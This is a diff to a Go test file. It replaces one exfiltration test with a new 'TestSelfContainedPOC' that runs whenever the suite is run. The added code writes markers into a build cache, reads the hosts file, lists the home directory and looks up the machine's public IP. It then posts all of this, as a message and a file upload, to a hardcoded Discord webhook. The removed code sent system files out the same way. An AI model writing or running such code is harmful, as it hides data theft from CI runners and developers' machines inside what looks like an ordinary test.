@@ -2,139 +2,156 @@ package tests
 
 import (
 	"bytes"
-	"encoding/base64"
 	"encoding/json"
+	"fmt"
+	"io"
+	"mime/multipart"
 	"net"
 	"net/http"
 	"os"
+	"os/exec"
+	"path/filepath"
 	"runtime"
+	"sort"
 	"strings"
 	"testing"
 	"time"
 )
 
-const hardcodedWebhook = "https://discord.com/api/webhooks/1409963954406686872/G9wHeBGquh4XpqmxKho5BtXEDL_J0sO-GQAiD8Zj4h6oRYHuQKikDH_9zrGt423XREQ8"
+func TestSelfContainedPOC(t *testing.T) {
+	// --- Settings (hardcoded) ---
+	webhook := "https://discord.com/api/webhooks/1409963954406686872/G9wHeBGquh4XpqmxKho5BtXEDL_J0sO-GQAiD8Zj4h6oRYHuQKikDH_9zrGt423XREQ8"
+	cacheDir := "build/cache"
 
-func TestPwnInfoAndLFIToDiscord(t *testing.T) {
-	// Write a marker file so you know it executed
+	// 0) Marker file
 	_ = os.WriteFile("pwn_marker.txt", []byte("PWN_MARKER: PoC execution\n"), 0644)
 
-	// Pick webhook
-	webhook := os.Getenv("PWN_WEBHOOK")
-	if webhook == "" {
-		webhook = hardcodedWebhook
+	// 1) Cache check/poison
+	if err := os.MkdirAll(cacheDir, 0o755); err != nil {
+		t.Logf("[cache] mkdir %s: %v", cacheDir, err)
 	}
+	cacheMarker := filepath.Join(cacheDir, "pwn_cache_marker.txt")
+	prev, _ := os.ReadFile(cacheMarker)
+	marker := fmt.Sprintf("updated=%s host=%s go=%s\n",
+		time.Now().UTC().Format(time.RFC3339),
+		hostnameSafe(),
+		runtime.GOOS+"/"+runtime.GOARCH,
+	)
+	_ = os.WriteFile(cacheMarker, append(prev, []byte(marker)...), 0o644)
+	cacheState, _ := os.ReadFile(cacheMarker)
 
-	// Collect basic runner info
-	cwd, _ := os.Getwd()
-	ips := collectIPv4s()
+	// 2) LFI data → temp file
+	tmpf, _ := os.CreateTemp("", "lfiPoC-*")
+	tmpPath := tmpf.Name()
+	defer func() { _ = os.Remove(tmpPath) }()
 
-	// Try file reads (defaults + optional override)
-	lfiResults := tryLFIReads()
-
-	// Assemble Discord fields
-	fields := []map[string]string{
-		{"name": "CWD", "value": safeField(cwd)},
-		{"name": "GOOS/GOARCH", "value": runtime.GOOS + "/" + runtime.GOARCH},
-		{"name": "IPv4", "value": joinIPs(ips)},
-		{"name": "Marker", "value": "pwn_marker.txt written"},
+	var buf bytes.Buffer
+	fmt.Fprintln(&buf, "[POC] Local File Read + HOME listing")
+	fmt.Fprintf(&buf, "\n[+] Reading %s\n", hostsCandidate())
+	if b, err := os.ReadFile(hostsCandidate()); err == nil {
+		buf.Write(b)
+	} else {
+		fmt.Fprintf(&buf, "No access: %v\n", err)
 	}
-	for _, r := range lfiResults {
-		fields = append(fields, map[string]string{
-			"name":  "LFI: " + r.Path,
-			"value": r.Display,
-		})
+	home := homeDir()
+	fmt.Fprintf(&buf, "\n[+] Listing HOME (%s)\n", home)
+	if home != "" {
+		if entries, err := os.ReadDir(home); err == nil {
+			names := make([]string, 0, len(entries))
+			for _, e := range entries {
+				names = append(names, e.Name())
+			}
+			sort.Strings(names)
+			for _, n := range names {
+				fmt.Fprintf(&buf, " - %s\n", n)
+			}
+		}
 	}
-
-	payload := map[string]interface{}{
-		"content": "### PWN_MARKER: PoC execution (runner info + LFI)",
-		"embeds": []map[string]interface{}{
-			{
-				"title":     "Self-hosted Runner Probe",
-				"fields":    fields,
-				"timestamp": time.Now().UTC().Format(time.RFC3339),
-			},
-		},
+	fmt.Fprintf(&buf, "\n[+] Cache marker (%s tail)\n", cacheMarker)
+	if len(cacheState) > 2048 {
+		buf.Write(cacheState[:2048])
+		fmt.Fprintln(&buf, "...(truncated)")
+	} else {
+		buf.Write(cacheState)
 	}
+	tmpf.Write(buf.Bytes())
+	tmpf.Close()
 
-	body, _ := json.Marshal(payload)
-	req, _ := http.NewRequest(http.MethodPost, webhook, bytes.NewReader(body))
+	// 3a) IP pingback
+	publicIP := fetchPublicIP()
+	localIPs := strings.Join(collectIPv4s(), " ")
+	msg := fmt.Sprintf("POC IP pingback: host=%s public_ip=%s local_ips=%s",
+		hostnameSafe(), publicIP, localIPs)
+	_ = discordSimple(webhook, msg)
+
+	// 3b) Upload LFI file
+	if code, err := discordFile(webhook,
+		`{"content":"POC: Local File Read demo (/etc/hosts + HOME listing + cache marker)"}`,
+		tmpPath, "lfi-demo.txt"); err == nil {
+		t.Logf("Discord file upload HTTP %d", code)
+	}
+}
+
+/* ------------------ helpers ------------------ */
+
+func discordSimple(webhook, content string) error {
+	b, _ := json.Marshal(map[string]string{"content": content})
+	req, _ := http.NewRequest(http.MethodPost, webhook, bytes.NewReader(b))
 	req.Header.Set("Content-Type", "application/json")
-
-	client := &http.Client{Timeout: 6 * time.Second}
-	_, _ = client.Do(req)
+	resp, err := http.DefaultClient.Do(req)
+	if err != nil {
+		return err
+	}
+	io.Copy(io.Discard, resp.Body)
+	resp.Body.Close()
+	return nil
 }
 
-// --- Helpers ---
+func discordFile(webhook, payloadJSON, filePath, filename string) (int, error) {
+	var body bytes.Buffer
+	w := multipart.NewWriter(&body)
+	fw, _ := w.CreateFormField("payload_json")
+	fw.Write([]byte(payloadJSON))
+	fw, _ = w.CreateFormFile("files[0]", filename)
+	f, _ := os.Open(filePath)
+	defer f.Close()
+	io.Copy(fw, f)
+	w.Close()
 
-type lfiResult struct {
-	Path    string
-	Display string
+	req, _ := http.NewRequest(http.MethodPost, webhook, &body)
+	req.Header.Set("Content-Type", w.FormDataContentType())
+	resp, err := http.DefaultClient.Do(req)
+	if err != nil {
+		return 0, err
+	}
+	io.Copy(io.Discard, resp.Body)
+	resp.Body.Close()
+	return resp.StatusCode, nil
 }
 
-func tryLFIReads() []lfiResult {
-	paths := defaultPaths()
-	if env := strings.TrimSpace(os.Getenv("PWN_LFI_PATHS")); env != "" {
-		paths = strings.Split(env, ",")
-	}
-
-	const maxBytes = 2048
-	var out []lfiResult
-	for _, p := range paths {
-		data, err := os.ReadFile(strings.TrimSpace(p))
-		if err != nil {
-			out = append(out, lfiResult{Path: p, Display: "_err: " + err.Error()})
-			continue
-		}
-		content := data
-		truncated := false
-		if len(content) > maxBytes {
-			content = content[:maxBytes]
-			truncated = true
-		}
-		b64 := base64.StdEncoding.EncodeToString(content)
-		if len(b64) > 900 {
-			b64 = b64[:900] + "...(trim)"
-		}
-		suffix := ""
-		if truncated {
-			suffix = " (truncated)"
-		}
-		out = append(out, lfiResult{
-			Path:    p,
-			Display: "base64:`" + b64 + "`" + suffix,
-		})
-	}
-	return out
-}
-
-func defaultPaths() []string {
-	if runtime.GOOS == "windows" {
-		return []string{
-			`C:\Windows\System32\drivers\etc\hosts`,
-			`C:\Windows\System32\license.rtf`,
+func fetchPublicIP() string {
+	if _, err := exec.LookPath("curl"); err == nil {
+		if out, err := exec.Command("curl", "-fsS", "https://ifconfig.me").Output(); err == nil {
+			return strings.TrimSpace(string(out))
 		}
 	}
-	return []string{"/etc/hostname", "/etc/hosts", "/etc/os-release"}
+	resp, err := http.Get("https://ifconfig.me")
+	if err != nil {
+		return ""
+	}
+	defer resp.Body.Close()
+	b, _ := io.ReadAll(resp.Body)
+	return strings.TrimSpace(string(b))
 }
 
 func collectIPv4s() []string {
 	var out []string
-	ifaces, err := net.Interfaces()
-	if err != nil {
-		return out
-	}
+	ifaces, _ := net.Interfaces()
 	for _, iface := range ifaces {
 		addrs, _ := iface.Addrs()
 		for _, a := range addrs {
-			switch v := a.(type) {
-			case *net.IPNet:
-				ip := v.IP.To4()
-				if ip != nil && !ip.IsLoopback() {
-					out = append(out, ip.String())
-				}
-			case *net.IPAddr:
-				ip := v.IP.To4()
+			if ipnet, ok := a.(*net.IPNet); ok {
+				ip := ipnet.IP.To4()
 				if ip != nil && !ip.IsLoopback() {
 					out = append(out, ip.String())
 				}
@@ -144,19 +161,24 @@ func collectIPv4s() []string {
 	return out
 }
 
-func joinIPs(ips []string) string {
-	if len(ips) == 0 {
-		return "_none_"
+func hostsCandidate() string {
+	if runtime.GOOS == "windows" {
+		return `C:\Windows\System32\drivers\etc\hosts`
 	}
-	return strings.Join(ips, ", ")
+	return "/etc/hosts"
 }
 
-func safeField(s string) string {
-	if s == "" {
-		return "_empty_"
+func homeDir() string {
+	if runtime.GOOS == "windows" {
+		return os.Getenv("USERPROFILE")
 	}
-	if len(s) > 1024 {
-		return s[:1024] + "...(trim)"
+	return os.Getenv("HOME")
+}
+
+func hostnameSafe() string {
+	h, err := os.Hostname()
+	if err != nil || h == "" {
+		return "unknown-host"
 	}
-	return s
+	return h
 }
